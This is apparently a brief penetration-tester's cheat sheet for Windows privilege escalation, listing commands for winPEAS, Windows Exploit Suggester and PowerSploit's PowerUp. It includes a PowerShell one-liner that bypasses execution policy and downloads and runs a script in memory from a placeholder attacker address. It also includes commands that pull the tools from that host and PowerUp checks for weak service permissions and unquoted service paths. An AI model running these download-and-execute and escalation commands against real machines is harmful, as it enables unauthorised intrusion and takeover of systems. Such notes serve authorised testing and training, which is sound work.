# Winpeas
```powershell
powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$IP_ADDRESS/winpeas.ps1'))"
```

```powershell
iwr -uri http://$(IP_ADDRESS)/winPEASx64.exe -Outfile winPEAS.exe
```
# Windows Exploit Suggester
https://github.com/bitsadmin/wesng
```batch
systeminfo
```
Save the output as systeminfo.txt locally.
The run the tool:
```bash
pip install wesng
```

```
wes.py systeminfo.txt
```
# PowerUp
```batch
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
```

```powershell
iwr -uri http://$(IP_ADDRESS)/PowerUp.ps1 -Outfile PowerUp.ps1
```

```powershell
powershell -ep bypass
```

```powershell
. .\PowerUp.ps1
```

```powershell
Get-ModifiableServiceFile
```

```powershell
Get-UnquotedService
```

```
Invoke-AllChecks
```
